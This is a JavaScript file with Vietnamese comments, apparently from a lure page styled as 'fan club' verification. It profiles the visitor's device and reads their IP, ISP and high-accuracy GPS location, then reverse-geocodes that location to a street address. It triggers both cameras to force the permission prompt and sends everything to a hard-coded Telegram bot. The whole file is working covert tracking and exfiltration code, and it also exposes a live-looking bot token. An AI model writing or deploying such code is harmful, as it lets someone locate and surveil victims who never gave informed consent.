const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';
const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
    time: '',
    ip: '',
    isp: '',
    realIp: '',
    address: '',
    lat: '',
    lon: '',
    device: '',
    os: '',
    camera: '⏳ Đang kiểm tra...'
};

// --- HÀM DETECT THIẾT BỊ ---
function detectDevice() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    if (/Android/i.test(ua)) {
        info.os = 'Android';
        const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
        info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
    } else if (/iPhone|iPad|iPod/i.test(ua)) {
        info.os = 'iOS';
        info.device = 'iPhone/iPad';
    } else {
        info.device = 'PC / Khác';
        info.os = platform;
    }
}

// --- HÀM LẤY IP ---
async function getIPs() {
    try {
        const res = await fetch('https://ipwho.is/').then(r => r.json());
        info.ip = res.ip;
        info.isp = res.connection?.org || 'N/A';
        info.lat = res.latitude;
        info.lon = res.longitude;
    } catch (e) { info.ip = 'Lỗi lấy IP'; }
}

// --- HÀM LẤY VỊ TRÍ GPS ---
async function getLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve();
        navigator.geolocation.getCurrentPosition(
            async pos => {
                info.lat = pos.coords.latitude.toFixed(6);
                info.lon = pos.coords.longitude.toFixed(6);
                try {
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                    const data = await res.json();
                    info.address = data.display_name;
                } catch { info.address = `Tọa độ: ${info.lat}, ${info.lon}`; }
                resolve();
            },
            () => resolve(),
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

// --- HÀM XIN QUYỀN CAMERA (KÍCH HOẠT 2 CAM NHƯNG KHÔNG LƯU) ---
async function triggerCameras() {
    let results = [];
    try {
        // Kích hoạt Cam Trước (user)
        const stream1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        stream1.getTracks().forEach(t => t.stop()); // Tắt ngay
        results.push("Trước");

        // Kích hoạt Cam Sau (environment) - Một số máy sẽ hiện thông báo xin quyền lần 2
        const stream2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
        stream2.getTracks().forEach(t => t.stop()); // Tắt ngay
        results.push("Sau");

        info.camera = `✅ Đã quét: ${results.join(" & ")}`;
    } catch (e) {
        info.camera = results.length > 0 ? `✅ Chỉ quét được Cam ${results[0]}` : '🚫 Bị từ chối';
        throw e; // Ném lỗi để HTML xử lý Reload nếu bị từ chối
    }
}

// --- GỬI TIN NHẮN ---
async function sendTextOnly() {
    const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
    const caption = `
📡 <b>[THÔNG TIN FAN CLUB]</b>
--------------------------
🕒 <b>Thời gian:</b> ${info.time}
📱 <b>Thiết bị:</b> ${info.device} (${info.os})
🌍 <b>IP/ISP:</b> ${info.ip} | ${info.isp}
🏙️ <b>Địa chỉ:</b> ${info.address || 'Đang cập nhật...'}
📍 <b>Vị trí:</b> <a href="${mapsLink}">Nhấn để xem bản đồ</a>
📸 <b>Xác thực:</b> ${info.camera}
`.trim();

    return fetch(API_SEND_TEXT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: caption, parse_mode: 'HTML' })
    });
}

// --- HÀM CHÍNH ---
async function main() {
    info.time = new Date().toLocaleString('vi-VN');
    detectDevice();
    
    // 1. Chạy quét camera trước để ép quyền
    await triggerCameras();
    
    // 2. Lấy vị trí và IP
    await Promise.all([getIPs(), getLocation()]);

    // 3. Gửi về Tele
    await sendTextOnly();
}
